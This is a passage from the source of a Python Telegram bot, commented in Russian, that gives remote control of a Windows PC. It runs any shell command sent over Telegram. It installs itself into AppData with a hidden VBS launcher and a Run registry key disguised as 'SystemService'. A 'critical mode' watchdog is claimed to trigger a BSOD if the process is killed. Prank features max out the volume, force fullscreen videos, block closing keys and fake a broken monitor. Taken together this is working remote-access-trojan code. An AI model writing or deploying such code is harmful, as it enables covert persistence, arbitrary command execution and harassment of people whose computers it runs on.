        }}, 500);
    </script>
</body>
</html>
"@
                
                # Сохраняем HTML файл
                $tempFile = "$env:TEMP\\falling_screen_$(Get-Random).html"
                $htmlContent | Out-File -FilePath $tempFile -Encoding UTF8
                
                # Открываем в браузере
                Start-Process $tempFile
                
                Write-Host "✅ Падающий экран запущен!"
                '''
                
                # Запускаем PowerShell скрипт
                subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                    creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                )
                
                await query.edit_message_text(
                    f"✅ Падающий экран активирован!\n\n"
                    f"⏱️ Длительность: {time_str}\n"
                    f"📺 Экран \"падает\" и размывается\n"
                    f"🌫️ Эффект сломанного дисплея\n"
                    f"🔄 Циклическая анимация\n"
                    f"📻 Звуки статики\n"
                    f"🔒 Сложно закрыть\n\n"
                    f"⚠️ Выглядит как настоящая поломка!\n"
                    f"😈 Пользователь подумает что монитор сломался!"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "loud_video_rickroll":
        await query.edit_message_text("🎵 Запускаю Rickroll...")
        await launch_loud_video("https://www.youtube.com/watch?v=dQw4w9WgXcQ", query)
    
    elif action == "loud_video_screamer":
        await query.edit_message_text("😱 Запускаю скример...")
        await launch_loud_video("https://www.youtube.com/watch?v=HqGsT6VM8Vg", query)
    
    elif action == "loud_video_meme":
        await query.edit_message_text("🎪 Запускаю мемное видео...")
        await launch_loud_video("https://www.youtube.com/watch?v=ZZ5LpwO-An4", query)
    
    elif action == "loud_video_custom":
        await query.edit_message_text(
            "🔗 *Введите ссылку на видео*\n\n"
            "📝 Отправьте любую ссылку на видео\n\n"
            "🎯 Поддерживаемые форматы:\n"
            "• 🎵 **YouTube**: youtube.com, youtu.be\n"
            "• 🎬 **Прямые видео**: .mp4, .webm, .avi, .mov\n"
            "• 📺 **Стримы**: Twitch, VK Video, и др.\n"
            "• 🌐 **Любые видео ссылки**\n\n"
            "💡 Примеры:\n"
            "`https://www.youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "`https://example.com/video.mp4`\n"
            "`https://vk.com/video123456789`\n\n"
            "⚠️ **Видео откроется на ПОЛНУЮ громкость и полный экран!**\n"
            "🔒 **Будет сложно закрыть!**",
            parse_mode='Markdown'
        )
        # Устанавливаем состояние ожидания ссылки
        context.user_data['waiting_for_video_url'] = True
        await show_back_button(query)
    
    elif action == "lock":
        await query.edit_message_text("🔒 Блокировка ПК...")
        if platform.system() == "Windows":
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"])
        await query.edit_message_text("✅ ПК заблокирован!")
        await show_back_button(query)
    
    elif action == "restart":
        keyboard = [
            [
                InlineKeyboardButton("✅ Да, перезагрузить", callback_data="confirm_restart"),
                InlineKeyboardButton("❌ Отмена", callback_data="back")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("⚠️ Вы уверены, что хотите перезагрузить ПК?", reply_markup=reply_markup)
    
    elif action == "confirm_restart":
        await query.edit_message_text("🔄 Перезагрузка через 10 секунд...")
        if platform.system() == "Windows":
            subprocess.run(["shutdown", "/r", "/t", "10"])
    
    elif action == "shutdown":
        keyboard = [
            [
                InlineKeyboardButton("✅ Да, выключить", callback_data="confirm_shutdown"),
                InlineKeyboardButton("❌ Отмена", callback_data="back")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("⚠️ Вы уверены, что хотите выключить ПК?", reply_markup=reply_markup)
    
    elif action == "confirm_shutdown":
        await query.edit_message_text("⏻ Выключение через 10 секунд...")
        if platform.system() == "Windows":
            subprocess.run(["shutdown", "/s", "/t", "10"])
    
    elif action == "install_autostart":
        await query.edit_message_text("⚙️ Установка в автозагрузку...")
        try:
            if platform.system() == "Windows":
                # Получаем путь к текущему скрипту
                current_script = os.path.abspath(__file__)
                script_name = os.path.basename(current_script)
                
                # Создаем папку в AppData\Roaming\Programs если её нет
                appdata = os.environ.get('APPDATA')
                programs_dir = os.path.join(appdata, 'Programs')
                os.makedirs(programs_dir, exist_ok=True)
                
                # Путь назначения
                destination = os.path.join(programs_dir, script_name)
                
                # Получаем исходную директорию
                source_dir = os.path.dirname(current_script)
                
                # Подсчёт скопированных файлов
                copied_files = []
                total_files = 0
                total_folders = 0
                
                # Копируем ВСЕ файлы и папки из текущей директории
                for item in os.listdir(source_dir):
                    source_item = os.path.join(source_dir, item)
                    dest_item = os.path.join(programs_dir, item)
                    
                    try:
                        if os.path.isfile(source_item):
                            # Копируем файл
                            shutil.copy2(source_item, dest_item)
                            total_files += 1
                            
                            # Добавляем в список важные файлы
                            if item in ['bot.py', 'watchdog.py', 'config_example.py', 'requirements.txt', 'README.md']:
                                copied_files.append(f"✅ {item}")
                        
                        elif os.path.isdir(source_item):
                            # Копируем папку целиком
                            if os.path.exists(dest_item):
                                shutil.rmtree(dest_item)
                            shutil.copytree(source_item, dest_item)
                            
                            # Подсчитываем файлы в папке
                            folder_files = sum([len(files) for _, _, files in os.walk(dest_item)])
                            total_folders += 1
                            copied_files.append(f"✅ {item}/ ({folder_files} файлов)")
                    
                    except Exception as e:
                        copied_files.append(f"⚠️ {item} (ошибка: {str(e)[:20]})")
                
                # Создаем VBS скрипт для скрытого запуска
                vbs_name = script_name.replace('.py', '_hidden.vbs')
                vbs_path = os.path.join(programs_dir, vbs_name)
                
                vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw.exe ""{destination}""", 0, False
Set WshShell = Nothing'''
                
                with open(vbs_path, 'w', encoding='utf-8') as f:
                    f.write(vbs_content)
                
                copied_files.append(f"✅ {vbs_name}")
                
                # Устанавливаем Guardian (защитник целостности)
                guardian_installed = False
                guardian_source = os.path.join(source_dir, 'guardian.py')
                if os.path.exists(guardian_source):
                    try:
                        # Запускаем Guardian для установки
                        subprocess.Popen(
                            ["pythonw.exe", guardian_source],
                            cwd=programs_dir,
                            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                        )
                        guardian_installed = True
                        copied_files.append("✅ Guardian (защита файлов)")
                    except Exception as e:
                        copied_files.append(f"⚠️ Guardian (ошибка: {str(e)[:20]})")
                
                # Добавляем в автозагрузку через реестр
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, vbs_path)
                winreg.CloseKey(key)
                
                # Формируем отчёт
                files_report = "\n".join(copied_files[:10])  # Показываем первые 10
                if len(copied_files) > 10:
                    files_report += f"\n... и ещё {len(copied_files) - 10} элементов"
                
                # Экранируем путь для Markdown
                safe_path = programs_dir.replace('_', '\\_')
                
                guardian_status = "🛡️ Guardian активирован\n" if guardian_installed else ""
                
                await query.edit_message_text(
                    f"✅ Установка завершена!\n\n"
                    f"📂 Папка:\n{safe_path}\n\n"
                    f"📊 Всего скопировано:\n"
                    f"📄 Файлов: {total_files}\n"
                    f"📁 Папок: {total_folders}\n\n"
                    f"📦 Основные файлы:\n{files_report}\n\n"
                    f"🔄 Добавлено в автозагрузку\n"
                    f"{guardian_status}"
                    f"💀 Критический режим будет работать\n\n"
                    f"⚠️ Бот автоматически запустится после перезагрузки ПК"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка установки: {str(e)}")
        await show_back_button(query)
    
    elif action == "toggle_critical":
        global CRITICAL_MODE, WATCHDOG_RUNNING
        
        if not CRITICAL_MODE:
            # Включение критического режима
            CRITICAL_MODE = True
            WATCHDOG_RUNNING = True
            
            # Создаём первичный heartbeat
            create_heartbeat()
            
            # Запускаем heartbeat поток (обновляет файл)
            heartbeat = threading.Thread(target=heartbeat_thread, daemon=True)
            heartbeat.start()
            
            # Запускаем ВНЕШНИЙ watchdog процесс (независимый от бота!)
            try:
                script_dir = os.path.dirname(os.path.abspath(__file__))
                watchdog_script = os.path.join(script_dir, "watchdog.py")
                
                if os.path.exists(watchdog_script):
                    # Запускаем watchdog как отдельный процесс
                    subprocess.Popen(
                        [sys.executable, watchdog_script, str(BOT_PROCESS_ID), HEARTBEAT_FILE],
                        creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    watchdog_status = "✅ Внешний процесс запущен"
                else:
                    # Fallback: запускаем внутренний поток
                    watchdog = threading.Thread(target=watchdog_thread, daemon=False)
                    watchdog.start()
                    watchdog_status = "⚠️ Внутренний поток (fallback)"
            except Exception as e:
                # Fallback: запускаем внутренний поток
                watchdog = threading.Thread(target=watchdog_thread, daemon=False)
                watchdog.start()
                watchdog_status = f"⚠️ Ошибка внешнего: {e}"
            
            status_emoji = "🔴"
            status_text = "ВКЛЮЧЁН"
            warning = f"\n\n⚠️ КРИТИЧЕСКИЙ РЕЖИМ АКТИВЕН!\n\n• Watchdog: {watchdog_status}\n• Heartbeat: Обновляется каждые 2 сек\n• PID бота: {BOT_PROCESS_ID}\n\n💀 При завершении процесса → BSOD!\n\n🔥 Тест: завершите процесс Python в диспетчере задач"
        else:
            # Выключение критического режима
            CRITICAL_MODE = False
            WATCHDOG_RUNNING = False
            
            # Удаляем heartbeat файл
            try:
                if os.path.exists(HEARTBEAT_FILE):
                    os.remove(HEARTBEAT_FILE)
            except:
                pass
            
            status_emoji = "🟢"
            status_text = "ВЫКЛЮЧЁН"
            warning = "\n\nСистема в безопасном режиме.\nWatchdog остановлен."
        
        await query.edit_message_text(
            f"💀 *Критический режим*\n\n"
            f"Статус: {status_emoji} {status_text}"
            f"{warning}",
            parse_mode='Markdown'
        )
        await show_back_button(query)
    
    elif action == "back":
        await start_menu(query)

async def handle_volume(query, action):
    """Управление громкостью"""
    try:
        if platform.system() == "Windows":
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            
            if action == "vol_mute":
                volume.SetMute(1, None)
                text = "🔇 Звук выключен"
            else:
                volume.SetMute(0, None)
                levels = {"vol_25": 0.25, "vol_50": 0.50, "vol_75": 0.75, "vol_100": 1.0}
                volume.SetMasterVolumeLevelScalar(levels[action], None)
                text = f"✅ Громкость установлена: {int(levels[action]*100)}%"
            
            await query.edit_message_text(text)
        else:
            await query.edit_message_text("❌ Управление громкостью доступно только на Windows")
    except ImportError:
        await query.edit_message_text("❌ Установите библиотеки: pip install pycaw comtypes")
    except Exception as e:
        await query.edit_message_text(f"❌ Ошибка: {str(e)}")
    
    await show_back_button(query)

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик текстовых сообщений"""
    user_id = update.effective_user.id
    
    if not check_access(user_id):
        await update.message.reply_text("❌ У вас нет доступа!")
        return
    
    # Обработка ссылки на видео
    if context.user_data.get('waiting_for_video_url'):
        context.user_data['waiting_for_video_url'] = False
        video_url = update.message.text.strip()
        
        # Проверяем что это похоже на ссылку
        if not (video_url.startswith('http://') or video_url.startswith('https://')):
            await update.message.reply_text(
                "❌ Неверный формат ссылки!\n\n"
                "📝 Ссылка должна начинаться с http:// или https://\n"
                "💡 Пример: https://www.youtube.com/watch?v=dQw4w9WgXcQ"
            )
            return
        
        await update.message.reply_text("🔊 Запускаю ваше видео на полную громкость...")
        
        # Создаем фейковый query объект для launch_loud_video
        class FakeQuery:
            def __init__(self, message):
                self.message = message
            
            async def edit_message_text(self, text, **kwargs):
                await self.message.reply_text(text, **kwargs)
        
        fake_query = FakeQuery(update.message)
        await launch_loud_video(video_url, fake_query)
        return
    
    # Выполнение команды
    if context.user_data.get('awaiting_command'):
        context.user_data['awaiting_command'] = False
        command = update.message.text
        
        await update.message.reply_text(f"⚡ Выполняю команду: `{command}`", parse_mode='Markdown')
        
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            
            if not output.strip():
                output = "✅ Команда выполнена успешно (без вывода)"
            
            # Telegram имеет лимит в 4096 символов
            if len(output) > 4000:
                output = output[:4000] + "\n\n... (вывод обрезан)"
            
            await update.message.reply_text(f"```\n{output}\n```", parse_mode='Markdown')
        except subprocess.TimeoutExpired:
            await update.message.reply_text("❌ Команда выполняется слишком долго (таймаут)")
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка: {str(e)}")
    
    # Показать текст на экране
    elif context.user_data.get('awaiting_text'):
        context.user_data['awaiting_text'] = False
        text = update.message.text
        
        try:
            if platform.system() == "Windows":
                # Показываем текст через PowerShell с окном всегда поверх
                # Окно автоматически закроется через 5 секунд, закрыть раньше нельзя
                escaped_text = text.replace('"', '`"').replace("'", "''").replace('\n', '`n')
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                # Отключаем кнопку закрытия окна
                Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                public class Win32 {{
                    [DllImport("user32.dll")]
                    public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
                    [DllImport("user32.dll")]
                    public static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);
                    public const uint SC_CLOSE = 0xF060;
                    public const uint MF_BYCOMMAND = 0x00000000;
                    public const uint MF_GRAYED = 0x00000001;
                }}
"@
                
                $form = New-Object System.Windows.Forms.Form
                $form.Text = "Сообщение от Telegram"
                $form.Size = New-Object System.Drawing.Size(500, 320)
                $form.StartPosition = "CenterScreen"
                $form.TopMost = $true
                $form.FormBorderStyle = "FixedDialog"
                $form.MaximizeBox = $false
                $form.MinimizeBox = $false
                $form.ControlBox = $true
                
                # Отключаем кнопку закрытия
                $form.Add_Shown({{
                    $hWnd = $form.Handle
                    $hMenu = [Win32]::GetSystemMenu($hWnd, $false)
                    [Win32]::EnableMenuItem($hMenu, [Win32]::SC_CLOSE, [Win32]::MF_BYCOMMAND -bor [Win32]::MF_GRAYED)
                }})
                
                $label = New-Object System.Windows.Forms.Label
                $label.Location = New-Object System.Drawing.Point(20, 20)
                $label.Size = New-Object System.Drawing.Size(460, 200)
                $label.Text = "{escaped_text}"
                $label.Font = New-Object System.Drawing.Font("Segoe UI", 12)
                $label.AutoSize = $false
                
                # Таймер для отображения оставшегося времени
                $timerLabel = New-Object System.Windows.Forms.Label
                $timerLabel.Location = New-Object System.Drawing.Point(180, 240)
                $timerLabel.Size = New-Object System.Drawing.Size(140, 30)
                $timerLabel.Text = "Закроется через: 5"
                $timerLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
                $timerLabel.TextAlign = "MiddleCenter"
                $timerLabel.ForeColor = [System.Drawing.Color]::Red
                
                $form.Controls.Add($label)
                $form.Controls.Add($timerLabel)
                
                # Таймер для автозакрытия
                $countdown = 5
                $timer = New-Object System.Windows.Forms.Timer
                $timer.Interval = 1000
                $timer.Add_Tick({{
                    $script:countdown--
                    $timerLabel.Text = "Закроется через: $($script:countdown)"
                    if ($script:countdown -le 0) {{
                        $timer.Stop()
                        $form.Close()
                    }}
                }})
                $timer.Start()
                
                [void]$form.ShowDialog()
                $timer.Dispose()
                '''
                subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command])
                await update.message.reply_text(f"✅ Текст показан на экране (закроется через 5 сек):\n\n{text}")
            else:
                await update.message.reply_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка: {str(e)}")

async def launch_loud_video(video_url, query):
    """Запуск громкого видео на полный экран"""
    try:
        if platform.system() == "Windows":
            # PowerShell скрипт для максимальной громкости и открытия видео
            ps_command = f'''
            # Устанавливаем максимальную громкость
            Add-Type -AssemblyName System.Windows.Forms
            
            # Устанавливаем громкость на 100%
            $obj = New-Object -ComObject WScript.Shell
            for ($i = 0; $i -lt 50; $i++) {{
                $obj.SendKeys([char]175)  # Volume Up
                Start-Sleep -Milliseconds 50
            }}
            
            # Определяем тип видео и создаем соответствующий HTML
            $isYouTube = $false
            $isDirectVideo = $false
            $embedUrl = "{video_url}"
            
            if ("{video_url}" -match "youtube\.com|youtu\.be") {{
                $isYouTube = $true
                $embedUrl = "{video_url}" -replace "watch\?v=", "embed/" -replace "youtu\.be/", "youtube.com/embed/"
                $embedUrl += "?autoplay=1&loop=1&controls=0&modestbranding=1&rel=0&showinfo=0&fs=1&iv_load_policy=3"
            }}
            elseif ("{video_url}" -match "\.(mp4|webm|ogg|avi|mov)") {{
                $isDirectVideo = $true
            }}
            
            # Создаем HTML файл для полноэкранного видео
            $htmlContent = @"
<!DOCTYPE html>
<html>
<head>
    <title>🔊 ГРОМКОЕ ВИДЕО</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: black;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }}
        iframe, video {{
            width: 100vw;
            height: 100vh;
            border: none;
        }}
        .overlay {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            display: none;
            color: white;
            text-align: center;
            padding-top: 45vh;
            font-size: 24px;
        }}
        .error {{
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            text-align: center;
            font-size: 18px;
            background: rgba(255,0,0,0.8);
            padding: 20px;
            border-radius: 10px;
        }}
    </style>
</head>
<body>
    <div class="overlay" id="overlay">
        <div>🔊 ВОЗВРАЩАЮ ПОЛНЫЙ ЭКРАН...</div>
    </div>
    
"@
            
            if ($isYouTube) {{
                $htmlContent += @"
    <iframe src="$embedUrl" 
            allow="autoplay; fullscreen" 
            allowfullscreen>
    </iframe>
"@
            }}
            elseif ($isDirectVideo) {{
                $htmlContent += @"
    <video autoplay loop controls muted id="mainVideo">
        <source src="{video_url}" type="video/mp4">
        <div class="error">❌ Не удалось загрузить видео</div>
    </video>
"@
            }}
            else {{
                $htmlContent += @"
    <iframe src="{video_url}" 
            allow="autoplay; fullscreen" 
            allowfullscreen>
    </iframe>
    <div class="error" id="errorMsg" style="display:none;">
        ❌ Ошибка загрузки<br>
        🔗 Проверьте ссылку<br>
        💡 Поддерживаются: YouTube, MP4, WebM
    </div>
"@
            }}
            
            $htmlContent += @"
    
    <script>
        // Блокируем закрытие
        window.addEventListener('beforeunload', function(e) {{
            e.preventDefault();
            e.returnValue = '';
            return '';
        }});
        
        // Блокируем F11, Alt+F4, Ctrl+W
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'F11' || 
                (e.altKey && e.key === 'F4') || 
                (e.ctrlKey && e.key === 'w') ||
                (e.ctrlKey && e.key === 'W')) {{
                e.preventDefault();
                return false;
            }}
        }});
        
        // Автоматически в полный экран
        setTimeout(function() {{
            document.documentElement.requestFullscreen();
        }}, 1000);
        
        // Показываем overlay при попытке выйти из полного экрана
        document.addEventListener('fullscreenchange', function() {{
            if (!document.fullscreenElement) {{
                document.getElementById('overlay').style.display = 'block';
                setTimeout(function() {{
                    document.documentElement.requestFullscreen();
                    document.getElementById('overlay').style.display = 'none';
                }}, 2000);
            }}
        }});
    </script>
</body>
</html>
"@
            
            # Сохраняем HTML файл
            $tempFile = "$env:TEMP\\loud_video_$(Get-Random).html"
            $htmlContent | Out-File -FilePath $tempFile -Encoding UTF8
            
            # Открываем в браузере
            Start-Process $tempFile
            
            Write-Host "✅ Громкое видео запущено!"
            '''
            
            # Запускаем PowerShell скрипт
            subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
            )
            
            await query.edit_message_text(
                "✅ Громкое видео запущено!\n\n"
                "🔊 Громкость: **100%** (максимум!)\n"
                "🎬 Режим: **Полный экран**\n"
                "🔄 Зацикливание: **Включено**\n"
                "🔒 Закрытие: **Заблокировано**\n\n"
                "🎯 **Поддерживаются:**\n"
                "• YouTube, VK Video, Twitch\n"
                "• MP4, WebM, AVI файлы\n"
                "• Любые видео ссылки\n\n"
                "🛑 **Для остановки:**\n"
                "• Диспетчер задач → Закрыть браузер\n"
                "• Перезагрузка ПК\n"
                "• Выключение колонок\n\n"
                "😈 **МАКСИМАЛЬНЫЙ ТРОЛЛИНГ!**"
            )
        else:
            await query.edit_message_text("❌ Функция доступна только на Windows")
    except Exception as e:
        await query.edit_message_text(f"❌ Ошибка запуска видео: {str(e)}")

async def show_back_button(query):
    """Показать кнопку возврата в главное меню"""
    keyboard = [[InlineKeyboardButton("◀️ Главное меню", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.reply_text("Выберите действие:", reply_markup=reply_markup)

async def start_menu(query):
    """Вернуться в главное меню"""
    keyboard = [
        [
            InlineKeyboardButton("💻 Системная информация", callback_data="sysinfo")
        ],
        [
            InlineKeyboardButton("📸 Скриншот", callback_data="screenshot"),
            InlineKeyboardButton("🔊 Громкость", callback_data="volume_menu")
        ],
        [
            InlineKeyboardButton("⚡ Выполнить команду", callback_data="custom_cmd"),
            InlineKeyboardButton("📝 Показать текст", callback_data="show_text")
        ],
        [
            InlineKeyboardButton("😈 Троллинг", callback_data="trolling_menu"),
            InlineKeyboardButton("🔒 Заблокировать ПК", callback_data="lock")
        ],
        [
            InlineKeyboardButton("🔄 Перезагрузка", callback_data="restart"),
            InlineKeyboardButton("⏻ Выключить ПК", callback_data="shutdown")
        ],
        [
            InlineKeyboardButton("⚙️ Установить в автозагрузку", callback_data="install_autostart")
        ],
        [
            InlineKeyboardButton("💀 Критический режим", callback_data="toggle_critical")
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text("🤖 *Главное меню*\n\nВыберите действие:", reply_markup=reply_markup, parse_mode='Markdown')

def main():
    """Запуск бота"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ОШИБКА: Укажите токен бота в переменной BOT_TOKEN!")
        print("📝 Получите токен у @BotFather в Telegram")
        input("\nНажмите Enter для выхода...")
        sys.exit(1)
    
    print("🤖 Запуск бота управления ПК...")
    print(f"💻 Система: {platform.system()} {platform.release()}")
    print(f"🐍 Python: {platform.python_version()}")
    
    if ALLOWED_USERS:
        print(f"🔐 Доступ разрешен только для пользователей: {ALLOWED_USERS}")
    else:
        print("⚠️ ВНИМАНИЕ: Доступ разрешен всем пользователям!")
        print("   Рекомендуется добавить свой ID в ALLOWED_USERS для безопасности")
    
    print("\n✅ Бот запущен и ожидает команд...")
    print("📱 Напишите /start боту в Telegram\n")
    
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    # Запускаем бота
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🛑 Бот остановлен пользователем")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
        input("\nНажмите Enter для выхода...")
